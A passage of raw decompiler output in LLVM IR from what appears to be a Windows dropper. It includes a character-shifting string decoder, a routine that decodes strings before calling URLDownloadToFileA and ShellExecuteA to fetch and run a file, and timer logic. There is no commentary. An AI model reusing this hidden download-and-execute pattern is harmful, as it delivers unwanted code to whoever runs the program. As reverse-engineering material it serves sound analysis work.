  call void @PostQuitMessage(i32 66), !insn.addr !1320
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1321
  unreachable, !insn.addr !1321

dec_label_pc_40625c:                              ; preds = %dec_label_pc_40623a, %dec_label_pc_406228
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1322
}

define i32 @function_40626c() local_unnamed_addr {
dec_label_pc_40626c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1323
  %1 = icmp eq i32 %0, 0, !insn.addr !1323
  br i1 %1, label %dec_label_pc_40627a, label %dec_label_pc_406275, !insn.addr !1324

dec_label_pc_406275:                              ; preds = %dec_label_pc_40626c
  %2 = call i32 @function_40629c(), !insn.addr !1325
  br label %dec_label_pc_40627a, !insn.addr !1325

dec_label_pc_40627a:                              ; preds = %dec_label_pc_406275, %dec_label_pc_40626c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1326
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1327
  %5 = load i32, i32* %4, align 4, !insn.addr !1327
  %6 = mul i32 %5, 1000, !insn.addr !1327
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4219432 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1328
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1329
  ret i32 %7, !insn.addr !1330
}

define i32 @function_40629c() local_unnamed_addr {
dec_label_pc_40629c:
  %.reg2mem = alloca i32, !insn.addr !1331
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1331
  %1 = icmp eq i32 %0, 0, !insn.addr !1331
  store i32 %0, i32* %.reg2mem, !insn.addr !1332
  br i1 %1, label %2, label %dec_label_pc_4062a5, !insn.addr !1332

; <label>:2:                                      ; preds = %dec_label_pc_40629c
  %3 = call i32 @function_4062b9(), !insn.addr !1332
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1332
  br label %dec_label_pc_4062a5, !insn.addr !1332

dec_label_pc_4062a5:                              ; preds = %2, %dec_label_pc_40629c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1333
  ret i32 %.reload, !insn.addr !1334
}

define i32 @function_4062b9() local_unnamed_addr {
dec_label_pc_4062b9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1335
}

define i32 @function_4062bc() local_unnamed_addr {
dec_label_pc_4062bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_4061e0(i32 %0), !insn.addr !1336
  ret i32 %1, !insn.addr !1337
}

define i32 @function_4062c8() local_unnamed_addr {
dec_label_pc_4062c8:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1338
  %1 = icmp eq i32 %0, 0, !insn.addr !1338
  br i1 %1, label %dec_label_pc_4062d6, label %dec_label_pc_4062d1, !insn.addr !1339

dec_label_pc_4062d1:                              ; preds = %dec_label_pc_4062c8
  %2 = call i32 @function_4062f0(), !insn.addr !1340
  br label %dec_label_pc_4062d6, !insn.addr !1340

dec_label_pc_4062d6:                              ; preds = %dec_label_pc_4062d1, %dec_label_pc_4062c8
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4219580 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1341
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1342
  ret i32 %3, !insn.addr !1343
}

define i32 @function_4062f0() local_unnamed_addr {
dec_label_pc_4062f0:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1344
  ret i32 %0, !insn.addr !1345
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1346
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1346
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1346
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1347
  %2 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1348
  %3 = add i32 %2, 1, !insn.addr !1348
  store i32 %3, i32* @global_var_4096d4, align 4, !insn.addr !1348
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1349
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1350
  ret i32 0, !insn.addr !1351
}

define i32 @function_406335() local_unnamed_addr {
dec_label_pc_406335:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1352
  ret i32 %0, !insn.addr !1352
}

define i32 @function_40633a() local_unnamed_addr {
dec_label_pc_40633a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1353
}

define i32 @function_40633c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40633c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1354
}

define i32 @function_406340() local_unnamed_addr {
dec_label_pc_406340:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1355
  %2 = add i32 %1, -1, !insn.addr !1355
  store i32 %2, i32* @global_var_4096d4, align 4, !insn.addr !1355
  ret i32 %0, !insn.addr !1356
}

define i32 @function_406348() local_unnamed_addr {
dec_label_pc_406348:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1357
  ret i32 %0, !insn.addr !1357
}

define i32 @function_406350() local_unnamed_addr {
dec_label_pc_406350:
  %esi.0.reg2mem = alloca i32, !insn.addr !1358
  %ebx.0.reg2mem = alloca i32, !insn.addr !1358
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1359
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1360
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1360
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1360
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1361
  %4 = call i32 @function_4034c8(), !insn.addr !1362
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1363
  %6 = call i32 @function_4034c8(), !insn.addr !1364
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1365
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1365
  br i1 %7, label %dec_label_pc_4063c6, label %dec_label_pc_406396, !insn.addr !1365

dec_label_pc_406396:                              ; preds = %dec_label_pc_406350, %dec_label_pc_4063c2
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1366
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1366
  %11 = load i8, i8* %10, align 1, !insn.addr !1366
  %12 = icmp eq i8 %11, 61, !insn.addr !1366
  %13 = icmp eq i1 %12, false, !insn.addr !1367
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_4063ae, label %dec_label_pc_4063a0, !insn.addr !1367

dec_label_pc_4063a0:                              ; preds = %dec_label_pc_406396
  %15 = add i32 %14, %8, !insn.addr !1368
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1368
  store i8 46, i8* %16, align 1, !insn.addr !1368
  br label %dec_label_pc_4063c2, !insn.addr !1369

dec_label_pc_4063ae:                              ; preds = %dec_label_pc_406396
  %17 = load i8, i8* %10, align 1, !insn.addr !1370
  %18 = add i8 %17, -1, !insn.addr !1371
  %19 = add i32 %14, %8, !insn.addr !1372
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1372
  store i8 %18, i8* %20, align 1, !insn.addr !1372
  br label %dec_label_pc_4063c2, !insn.addr !1372

dec_label_pc_4063c2:                              ; preds = %dec_label_pc_4063ae, %dec_label_pc_4063a0
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1373
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1374
  %23 = icmp eq i32 %22, 0, !insn.addr !1374
  %24 = icmp eq i1 %23, false, !insn.addr !1375
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1375
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1375
  br i1 %24, label %dec_label_pc_406396, label %dec_label_pc_4063c6, !insn.addr !1375

dec_label_pc_4063c6:                              ; preds = %dec_label_pc_4063c2, %dec_label_pc_406350
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1376
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1377
  %26 = call i32 @"@LStrClr"(), !insn.addr !1378
  ret i32 %26, !insn.addr !1379
}

define i32 @function_4063dc() local_unnamed_addr {
dec_label_pc_4063dc:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1380
  ret i32 %0, !insn.addr !1380
}

define i32 @function_4063e1() local_unnamed_addr {
dec_label_pc_4063e1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1381
}

define i32 @function_4063e3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4063e3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1382
}

define i32 @function_4063ec() local_unnamed_addr {
dec_label_pc_4063ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1383
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1384
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1385
  ret i32 %4, !insn.addr !1386
}

define i32 @function_406424() local_unnamed_addr {
dec_label_pc_406424:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1387
  %esp.0.reg2mem = alloca i32, !insn.addr !1387
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1387
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1388
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1388
  br label %dec_label_pc_40642c, !insn.addr !1388

dec_label_pc_40642c:                              ; preds = %dec_label_pc_40642c, %dec_label_pc_406424
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1389
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1389
  store i32 0, i32* %2, align 4, !insn.addr !1389
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1390
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1390
  store i32 0, i32* %4, align 4, !insn.addr !1390
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1391
  %6 = icmp eq i32 %5, 0, !insn.addr !1391
  %7 = icmp eq i1 %6, false, !insn.addr !1392
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1392
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1392
  br i1 %7, label %dec_label_pc_40642c, label %dec_label_pc_406433, !insn.addr !1392

dec_label_pc_406433:                              ; preds = %dec_label_pc_40642c
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1393
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1393
  store i32 0, i32* %9, align 4, !insn.addr !1393
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1394
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1394
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1395
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1395
  store i32 %0, i32* %13, align 4, !insn.addr !1395
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1396
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1396
  store i32 4220267, i32* %15, align 4, !insn.addr !1396
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1397
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1397
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1397
  store i32 %16, i32* %18, align 4, !insn.addr !1397
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1398
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1399
  %20 = call i32 @function_406350(), !insn.addr !1400
  %21 = call i32 @function_4036c8(), !insn.addr !1401
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1402
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1403
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1403
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1403
  store i32 %25, i32* %24, align 4, !insn.addr !1403
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1404
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1405
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1406
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1406
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1406
  store i32 %30, i32* %29, align 4, !insn.addr !1406
  %31 = call i32 @function_4034c8(), !insn.addr !1407
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1408
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1409
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1409
  store i32 ptrtoint ([6 x i8]* @global_var_406580 to i32), i32* %34, align 4, !insn.addr !1409
  %35 = call i32 @function_4063ec(), !insn.addr !1410
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1411
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1411
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1412
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1412
  store i32 ptrtoint (i32* @global_var_406590 to i32), i32* %39, align 4, !insn.addr !1412
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1413
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1413
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1413
  store i32 %40, i32* %42, align 4, !insn.addr !1413
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1414
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1415
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1415
  store i32 0, i32* %45, align 4, !insn.addr !1415
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1416
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1416
  store i32 0, i32* %47, align 4, !insn.addr !1416
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1417
  %49 = call i32 @function_4036c8(), !insn.addr !1418
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1419
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1419
  store i32 %49, i32* %51, align 4, !insn.addr !1419
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1420
  %53 = call i32 @function_406350(), !insn.addr !1421
  %54 = call i32 @function_4036c8(), !insn.addr !1422
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1423
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1423
  store i32 %54, i32* %56, align 4, !insn.addr !1423
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1424
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1424
  store i32 0, i32* %58, align 4, !insn.addr !1424
  %59 = call i32 @function_406348(), !insn.addr !1425
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1426
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1426
  store i32 1, i32* %61, align 4, !insn.addr !1426
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1427
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1427
  store i32 0, i32* %63, align 4, !insn.addr !1427
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1428
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1428
  store i32 0, i32* %65, align 4, !insn.addr !1428
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1429
  %67 = call i32 @function_4036c8(), !insn.addr !1430
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1431
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1431
  store i32 %67, i32* %69, align 4, !insn.addr !1431
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1432
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1432
  store i32 ptrtoint ([5 x i8]* @global_var_4065a0 to i32), i32* %71, align 4, !insn.addr !1432
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1433
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1433
  store i32 0, i32* %73, align 4, !insn.addr !1433
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1434
  %75 = load i32, i32* %73, align 4, !insn.addr !1435
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1436
  store i32 4220274, i32* %69, align 4, !insn.addr !1437
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1438
  ret i32 %76, !insn.addr !1439
}

define i32 @function_40656b() local_unnamed_addr {
dec_label_pc_40656b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1440
  ret i32 %0, !insn.addr !1440
}

define i32 @function_406570() local_unnamed_addr {
dec_label_pc_406570:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1441
}

define i32 @function_406572(i32 %arg1) local_unnamed_addr {
dec_label_pc_406572:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1442
}

define i32 @function_406597(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406597:
  %esp.1.reg2mem = alloca i32, !insn.addr !1443
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1443
  %ecx.0.reg2mem = alloca i32, !insn.addr !1443
  %esp.0.reg2mem = alloca i32, !insn.addr !1443
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1443
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1443
  store i32 %5, i32* %6, align 4, !insn.addr !1443
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1444
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1444
  %11 = add i8 %8, %10, !insn.addr !1444
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1444
  store i8 %11, i8* %12, align 1, !insn.addr !1444
  %13 = add i32 %2, 58, !insn.addr !1445
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1445
  %15 = load i8, i8* %14, align 1, !insn.addr !1445
  %16 = load i32, i32* %eax, align 4, !insn.addr !1445
  %17 = udiv i32 %16, 256, !insn.addr !1445
  %18 = trunc i32 %17 to i8, !insn.addr !1445
  %19 = add i8 %15, %18, !insn.addr !1445
  store i8 %19, i8* %14, align 1, !insn.addr !1445
  %20 = add i32 %0, 112, !insn.addr !1446
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1446
  %22 = load i8, i8* %21, align 1, !insn.addr !1446
  %23 = trunc i32 %4 to i8, !insn.addr !1446
  %24 = add i8 %22, %23, !insn.addr !1446
  store i8 %24, i8* %21, align 1, !insn.addr !1446
  %25 = trunc i32 %3 to i16, !insn.addr !1447
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1447
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1447
  %27 = load i8, i8* %7, align 4, !insn.addr !1448
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1448
  %30 = add i8 %27, %29, !insn.addr !1448
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1448
  store i8 %30, i8* %31, align 1, !insn.addr !1448
  %32 = load i8, i8* %7, align 4, !insn.addr !1449
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1449
  %35 = add i8 %32, %34, !insn.addr !1449
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1449
  store i8 %35, i8* %36, align 1, !insn.addr !1449
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1450
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1451
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1451
  br label %dec_label_pc_4065b0, !insn.addr !1451

dec_label_pc_4065b0:                              ; preds = %dec_label_pc_4065b0, %dec_label_pc_406597
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1452
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1452
  store i32 0, i32* %39, align 4, !insn.addr !1452
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1453
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1453
  store i32 0, i32* %41, align 4, !insn.addr !1453
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1454
  %43 = icmp eq i32 %42, 0, !insn.addr !1454
  %44 = icmp eq i1 %43, false, !insn.addr !1455
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1455
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1455
  br i1 %44, label %dec_label_pc_4065b0, label %dec_label_pc_4065b7, !insn.addr !1455

dec_label_pc_4065b7:                              ; preds = %dec_label_pc_4065b0
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1456
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1456
  store i32 0, i32* %46, align 4, !insn.addr !1456
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1457
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1457
  store i32 %37, i32* %48, align 4, !insn.addr !1457
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1458
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1458
  store i32 4221004, i32* %50, align 4, !insn.addr !1458
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1459
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1459
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1459
  store i32 %51, i32* %53, align 4, !insn.addr !1459
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1460
  %54 = call i32 @"@LStrPos"(), !insn.addr !1461
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1462
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1462
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1462
  store i32 %57, i32* %56, align 4, !insn.addr !1462
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1463
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1464
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1464
  store i32 %61, i32* %60, align 4, !insn.addr !1464
  %62 = call i32 @function_4034c8(), !insn.addr !1465
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1466
  %64 = add i32 %arg1, -1, !insn.addr !1467
  store i32 %64, i32* %eax, align 4, !insn.addr !1467
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_406831 [
    i32 0, label %dec_label_pc_406629
    i32 1, label %dec_label_pc_406769
    i32 2, label %dec_label_pc_4067d7
  ]

dec_label_pc_406629:                              ; preds = %dec_label_pc_4065b7
  %65 = call i32 @function_4034c8(), !insn.addr !1468
  %66 = icmp slt i32 %65, 5, !insn.addr !1469
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1469
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1469
  br i1 %66, label %dec_label_pc_406831, label %dec_label_pc_40663a, !insn.addr !1469

dec_label_pc_40663a:                              ; preds = %dec_label_pc_406629
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1470
  %68 = call i32 @function_406350(), !insn.addr !1471
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1472
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1472
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1473
  %72 = call i32 @function_406350(), !insn.addr !1474
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1475
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1475
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1476
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1476
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1476
  store i32 %75, i32* %77, align 4, !insn.addr !1476
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1477
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1477
  store i32 ptrtoint (i32* @global_var_406870 to i32), i32* %79, align 4, !insn.addr !1477
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1478
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1478
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1478
  store i32 %80, i32* %82, align 4, !insn.addr !1478
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1479
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1480
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1480
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1481
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1481
  store i32 4221052, i32* %87, align 4, !insn.addr !1481
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1482
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1482
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1482
  store i32 %88, i32* %90, align 4, !insn.addr !1482
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1483
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1483
  store i32 4221068, i32* %92, align 4, !insn.addr !1483
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1484
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1484
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1484
  store i32 %93, i32* %95, align 4, !insn.addr !1484
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1485
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1485
  store i32 4221084, i32* %97, align 4, !insn.addr !1485
  %98 = call i32 @function_40774c(), !insn.addr !1486
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1487
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1487
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1488
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1489
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1489
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1490
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1490
  store i32 %106, i32* %105, align 4, !insn.addr !1490
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1491
  %108 = call i32 @function_406350(), !insn.addr !1492
  %109 = call i32 @"@LStrPos"(), !insn.addr !1493
  %110 = add i32 %109, -1, !insn.addr !1494
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1495
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1495
  store i32 %110, i32* %112, align 4, !insn.addr !1495
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1496
  %114 = call i32 @function_406350(), !insn.addr !1497
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1498
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1499
  store i32 %116, i32* %112, align 4, !insn.addr !1500
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1501
  %118 = call i32 @function_406350(), !insn.addr !1502
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1503
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1503
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1504
  %122 = call i32 @function_406350(), !insn.addr !1505
  %123 = call i32 @function_405a30(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1506
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1507
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1507
  br label %dec_label_pc_406831, !insn.addr !1507

dec_label_pc_406769:                              ; preds = %dec_label_pc_4065b7
  %124 = call i32 @function_4034c8(), !insn.addr !1508
  %125 = icmp slt i32 %124, 5, !insn.addr !1509
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1509
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1509
  br i1 %125, label %dec_label_pc_406831, label %dec_label_pc_40677a, !insn.addr !1509

dec_label_pc_40677a:                              ; preds = %dec_label_pc_406769
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1510
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1510
  store i32 ptrtoint ([5 x i8]* @global_var_4068bc to i32), i32* %127, align 4, !insn.addr !1510
  %128 = call i32 @function_404d80(), !insn.addr !1511
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1512
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1512
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1513
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1513
